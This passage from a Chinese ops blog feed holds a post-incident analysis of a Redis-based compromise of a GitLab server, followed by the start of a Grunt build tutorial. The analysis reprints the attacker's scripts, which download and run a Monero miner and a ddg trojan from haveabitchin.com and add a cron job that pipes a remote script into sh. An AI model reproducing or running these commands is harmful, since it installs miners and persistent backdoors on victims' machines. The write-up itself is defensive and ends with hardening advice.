&lt;span class=&quot;comment&quot;&gt;#fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;#chmod +x /opt/yam &amp;amp;&amp;amp; /opt/yam -c x -M stratum+tcp://4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC:x@xmr.crypto-pool.fr:443/xmr&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoMiner&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/AnXqV&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    chmod +x /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /tmp/AnXqV -B &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND&lt;span class=&quot;built_in&quot;&gt;fg&lt;/span&gt;MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC&quot;&lt;/span&gt; || DoMiner&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoRedis6379&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p tcp &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; 127.0.0.1 --dport 6379 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -I INPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D OUTPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D INPUT -j REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#iptables -N REDIS6379 &amp;amp;&amp;amp; DoRedis6379&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;分析了一下，它除了自身进程外，还有3个守护进程，而且这5个进程的PID和名称每秒都在变化，估计是在不停的重建吧。&lt;/p&gt;
&lt;p&gt;以及添加服务定时执行脚本。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir -p /var/spool/cron/crontabs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;*/5 * * * * curl -fsSL http://www.haveabitchin.com/pm.sh?0105008 | sh&quot;&lt;/span&gt; &amp;gt; /var/spool/cron/crontabs/root&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下载病毒文件，主要是截取我6379这个端口，提权，等等信息，这个文件对方做过加密的。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/ddg.217&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    curl -fsSL http://www.haveabitchin.com/ddg.$(uname -m) -o /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chmod +x /tmp/ddg.217 &amp;amp;&amp;amp; /tmp/ddg.217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;killall /tmp/ddg.216&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/opt/yam&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    rm -rf /opt/yam&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第二个病毒文件，反向代理肉鸡的木马，也加密过的。下载放到/tmp/下面 这个是临时文件。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoMiner&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;/tmp/AnXqV&quot;&lt;/span&gt; ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        curl -fsSL http://www.haveabitchin.com/minerd -o /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    chmod +x /tmp/AnXqV&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /tmp/AnXqV -B &lt;span class=&quot;_&quot;&gt;-a&lt;/span&gt; cryptonight -o stratum+tcp://xmr.crypto-pool.fr:443 -u 4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrND&lt;span class=&quot;built_in&quot;&gt;fg&lt;/span&gt;MKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC -p x&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ps auxf|grep -v grep|grep &lt;span class=&quot;string&quot;&gt;&quot;4Ab9s1RRpueZN2XxTM3vDWEHcmsMoEMW3YYsbGUwQSrNDfgMKVV8GAofToNfyiBwocDYzwY5pjpsMB7MY8v4tkDU71oWpDC&quot;&lt;/span&gt; || DoMiner&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对方配置的防火墙规则：&lt;/p&gt;
&lt;p&gt;6379 本地访问。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;DoRedis6379&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p tcp &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; 127.0.0.1 --dport 6379 -j ACCEPT    //只允许127.0.0.1访问6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 0.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 10.0.0.0/8 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 169.254.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 172.16.0.0/12 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 192.168.0.0/16 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;#iptables -A REDIS6379 -s 224.0.0.0/4 -p tcp --dport 6379 -j ACCEPT&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -A REDIS6379 -p TCP --dport 6379 -j REJECT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    iptables -I INPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D OUTPUT -j REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS6379&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -D INPUT -j REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -F REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iptables -X REDIS63792&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#iptables -N REDIS6379 &amp;amp;&amp;amp; DoRedis6379&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;删除这些文件，在看看就没问题了，后面把redis设置了。 我们当初设置了反向代理和防火墙规则，权限设置了很细，只能普通用户启动服务。&lt;/p&gt;
&lt;p&gt;总结：&lt;/p&gt;
&lt;p&gt;这次发生破灭性的攻击，总结经验这里gitlab走redis单独走本地：设置：bind单独本地跑。127.0.0.1 第二：普通用户启动redis，第三：设置防火墙。 &lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;今天早上5点多收到阿里云的告警：服务器CPU百分百，gitlab服务器访问出现500，第一时间排查问题。&lt;br&gt;毕竟这个关乎着开发今天可能无法提交代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/anqua
    
    </summary>
    
      <category term="运维安全" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Operation safety" scheme="http://blog.yangcvo.me/tags/Operation-safety/"/>
    
  </entry>
  
  <entry>
    <title>Node.js+Grunt工具搭建后台管理实践</title>
    <link href="http://blog.yangcvo.me/2016/11/24/Node.js/Node.js-Grunt%E5%B7%A5%E5%85%B7%E6%90%AD%E5%BB%BA%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%AE%9E%E8%B7%B5/"/>
    <id>http://blog.yangcvo.me/2016/11/24/Node.js/Node.js-Grunt工具搭建后台管理实践/</id>
    <published>2016-11-24T10:14:35.000Z</published>
    <updated>2017-03-29T10:17:35.000Z</updated>
    
    <content type="html">&lt;p&gt;最近弄灰度发布系统，由于最近体检项目需要对css文件和js文件进行压缩，各种比较之后，选择了grunt进行构建。google一下，几乎都是grunt最新版的使用说明 查看gruntjs的入门 Getting started，又是云里雾里的，好吧，只能耐心看文档和不断的实践吧。&lt;/p&gt;
&lt;h2 id=&quot;Grunt入门&quot;&gt;&lt;a href=&quot;#Grunt入门&quot; class=&quot;headerlink&quot; title=&quot;Grunt入门&quot;&gt;&lt;/a&gt;Grunt入门&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/yangcvo/Grunt.git&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;入门教程:&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;系统环境&quot;&gt;&lt;a href=&quot;#系统环境&quot; class=&quot;headerlink&quot; title=&quot;系统环境&quot;&gt;&lt;/a&gt;系统环境&lt;/h3&gt;&lt;p&gt;centos 6.6 x64&lt;/p&gt;
&lt;h3 id=&quot;Grunt安装过程：&quot;&gt;&lt;a href=&quot;#Grunt安装过程：&quot; class=&quot;headerlink&quot; title=&quot;Grunt安装过程：&quot;&gt;&lt;/a&gt;Grunt安装过程：&lt;/h3&gt;&lt;p&gt;1、前提安装了nodejs，进入官网后(&lt;a href=&quot;http://nodejs.org/)，点击“INSTALL”按钮，就会下载然后安装就行了。觉得现在windows安装node，挺简单的，感觉稳定性也提升了不少。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://nodejs.org/)，点击“INSTALL”按钮，就会下载然后安装就行了。觉得现在windows安装node，挺简单的，感觉稳定性也提升了不少。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、安装grunt命令行工具，有一句话总结“就是安装完CLI，还要在项目安装Grunt。”&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm install -g grunt-cli&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安装grunt及其插件，进入到某项目根目录，在命令行模式下，例如文件在c盘testGrunt目录下，利用cd命令到testGrunt目录下后，使用命令: &lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm install grunt --save-dev&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3、输入版本号验证安装是否成功，输入：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;grunt -version&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在这里我选择一个存放后台管理的文件目录。&lt;/p&gt;
&lt;h3 id=&quot;创建grunt项目&quot;&gt;&lt;a href=&quot;#创建grunt项目&quot; class=&quot;headerlink&quot; title=&quot;创建grunt项目&quot;&gt;&lt;/a&gt;创建grunt项目&lt;/h3&gt;&lt;p&gt;grunt项目一般需要以下内容:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1 、grunt（ 需要安装）&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2、 grunt 插件 （需要安装） &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3、package.json 和 Gruntfile.js 。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(官方入门Getting started 说通过 grunt-init 和 npm init 创建。对于入门来说，这两中方式都不太好用。推荐直接创建 package.json 和Gruntfile.js 文件)&lt;/p&gt;
&lt;p&gt;这里我之前创建过，直接在其他机器上面cp过来即可了。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1.创建文件夹:health-Grunt &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.在health-Grunt下面创建2个文件package.json 和 Gruntfile.js&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### 官网推荐：&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;``` bash &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;package.json 内容如下&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;smeitejs&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;0.1.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;description&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;js for smeite.com&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;homepage&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;http://cc.com/&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;author&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;helath &amp;lt;cc@qq.com&amp;gt;&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.4.1&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-jshint&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.3.0&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-nodeunit&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.1.2&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;grunt-contrib-cssmin&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;~0.5.0&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里我贴出我的本地配置：&lt;/p&gt;
